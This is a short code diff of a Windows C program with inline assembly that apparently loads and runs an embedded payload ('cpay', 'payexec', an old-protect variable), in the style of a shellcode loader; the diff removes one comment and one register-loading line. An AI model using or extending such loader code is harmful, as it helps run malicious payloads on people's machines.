@@ -6,8 +6,6 @@ unsigned char cpay_forsize[] = "0xcc";
 
 extern unsigned char cpay[];
 
-//    "lea rax, [returnhere]\n"
-
 int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine, int nShowCmd){
 
     DWORD op; //oldprotect
@@ -28,7 +26,6 @@ int WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine, int nS
     }
 
     asm volatile("lea r14,[%0]" :: "r"(&cpay)); 
-    asm volatile("lea r15,[%0]" :: "r"(&payexec)); 
 
     PVOID rtnaddr = NULL;
     asm volatile("lea r15,[rip + returnbackhere]");
